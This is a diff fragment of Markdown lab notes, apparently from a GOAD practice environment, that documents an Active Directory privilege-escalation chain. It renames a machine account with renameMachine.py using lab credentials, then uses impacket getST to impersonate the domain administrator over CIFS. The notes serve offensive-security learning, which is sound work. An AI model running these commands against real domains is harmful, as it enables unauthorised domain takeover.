@@ -130,3 +130,11 @@ impacket-getTGT -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdo
 ![[Pasted image 20230825170322.png]]
 ```bash
 renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing
+```
+![[Pasted image 20230825170418.png]]
+```bash
+export KRB5CCNAME=/workspace/winterfell.ccache
+```
+```bash
+getST -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
+```
